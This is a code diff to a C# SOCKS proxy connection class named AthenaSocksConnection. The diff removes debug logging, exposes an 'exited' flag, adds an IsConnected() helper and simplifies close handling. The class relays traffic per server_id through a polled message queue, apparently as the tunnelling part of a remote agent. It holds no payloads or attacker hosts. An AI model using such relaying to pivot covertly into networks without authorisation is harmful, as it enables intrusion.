@@ -12,14 +12,13 @@ namespace Athena.Models.Athena.Socks
         public AsyncTcpClient client;
         public AutoResetEvent onSocksEvent = new AutoResetEvent(false);
         private ConcurrentBag<SocksMessage> messages = new ConcurrentBag<SocksMessage>();
-        private bool exited;
+        public bool exited;
 
         public AthenaSocksConnection(ConnectionOptions co) {
             this.client = new AsyncTcpClient(co)
             {
                 ConnectedCallback = async (client, isReconnected) =>
                 {
-                    Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Connected!");
                     SocksMessage smOut = new SocksMessage(
                      this.server_id,
                      new ConnectResponse
@@ -29,29 +28,24 @@ namespace Athena.Models.Athena.Socks
                          addrtype = (byte)AddressType.IPv4,
                          status = ConnectResponseStatus.Success,
                      }.ToByte(),
-                     false
+                     this.IsConnected() ? false : true
                     );
                     this.messages.Add(smOut);
                     this.onSocksEvent.Set();
                 },
                 ClosedCallback = async (client, closedByRemote) =>
                 {
-                    Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Closed callback.");
                     this.onSocksEvent.Set();
+                    this.messages.Add(new SocksMessage(this.server_id, new byte[] { }, true));
                     this.exited = true;
-                    if (closedByRemote)
-                    {
-                        this.messages.Add(new SocksMessage(this.server_id, new byte[] { }, true));
-                    }
                 },
                 ReceivedCallback = async(client, count) =>
                 {
-                    Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Recieved {count} bytes.");
                     byte[] buf;
                     if(count > 0)
                     {
                         buf = this.client.ByteBuffer.Dequeue(count);
-                        this.messages.Add(new SocksMessage(this.server_id, buf, this.client.IsConnected ? false : true));
+                        this.messages.Add(new SocksMessage(this.server_id, buf, this.IsConnected() ? false : true));
                     }
                 }
             };
@@ -59,46 +53,28 @@ namespace Athena.Models.Athena.Socks
             this.exited = false;
         }
 
-        //private void OnDisconnected(object? sender, ConnectionEventArgs e)
-        //{
-        //    Console.WriteLine($"[{this.server_id}] OnDisconnected.");
-        //    this.onSocksEvent.Set();
-        //    this.exited = true;
-        //    //this.messages.Add(new SocksMessage(this.server_id, new byte[] { }, true));
-        //}
+        public bool IsConnected()
+        {
+            return this.client.IsConnected;
+            //try
+            //{
+            //    if (this.client is null)
+            //    {
+            //        return false;
+            //    }
 
-        //private void OnDataReceived(object? sender, DataReceivedEventArgs e)
-        //{
-        //    if (!this.client.IsConnected)
-        //    {
-        //        Console.WriteLine($"[{this.server_id}] Exited.");
-        //    }
-        //    this.messages.Add(new SocksMessage(this.server_id, e.Data.ToArray(), this.client.IsConnected ? false : true));
-        //}
-
-        //private void OnConnected(object? sender, ConnectionEventArgs e)
-        //{
-        //    SocksMessage smOut = new SocksMessage(
-        //     this.server_id,
-        //     new ConnectResponse
-        //     {
-        //         bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
-        //         bndport = new byte[] { 0x00, 0x00 },
-        //         addrtype = (byte)AddressType.IPv4,
-        //         status = ConnectResponseStatus.Success,
-        //     }.ToByte(),
-        //     this.client.IsConnected ? false : true
-        //    );
-        //    this.messages.Add(smOut);
-        //    this.onSocksEvent.Set();
-        //}
+            //    return this.client.IsConnected;
+            //}
+            //catch
+            //{
+            //    return false;
+            //}
+        }
 
         public List<SocksMessage> GetMessages()
         {
             List<SocksMessage> msgs = new List<SocksMessage>(this.messages);
-            Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Message Count Pre-Clear: {this.messages.Count()}");
             this.messages.Clear();
-            Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Message Count Post-Clear: {this.messages.Count()}");
 
             if (this.exited)
             {
